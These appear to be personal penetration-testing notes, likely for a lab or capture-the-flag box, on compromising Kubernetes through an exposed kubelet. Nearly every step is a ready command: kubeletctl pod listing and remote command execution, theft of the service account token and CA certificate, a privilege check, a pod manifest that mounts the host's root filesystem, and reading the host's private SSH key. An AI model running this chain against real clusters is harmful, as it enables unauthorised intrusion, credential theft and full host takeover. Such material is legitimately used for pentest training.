> IDK wtf i am writing

# Kubeletctl

## Extracting Pods

```sh
kubeletctl -i --server $target pods
```

## Available Commands

```sh
kubeletctl -i --server $target scan rce
```

## Execute command

`-p` for pod, `-c` for container

```sh
kubeletctl -i --server $target exec "id" -p nginx -c nginx
```

# Privesc

We must first have to obtain obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server

## Extract tokens

```sh
kubeletctl -i --server $target exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

## Extract cert

```sh
kubeletctl --server $target exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

## List privileges

```sh
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://$target:6443 auth can-i --list
```

## Create privesc pod

Create this `privesc.yaml` file

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Create the pod

```sh
kubectl --token=$token --certificate-authority=ca.crt --server=https://$target:6443 apply -f privesc.yaml

kubectl --token=$token --certificate-authority=ca.crt --server=https://$target:6443 get pods
```

Do whatever you want

```sh
kubeletctl --server $target exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
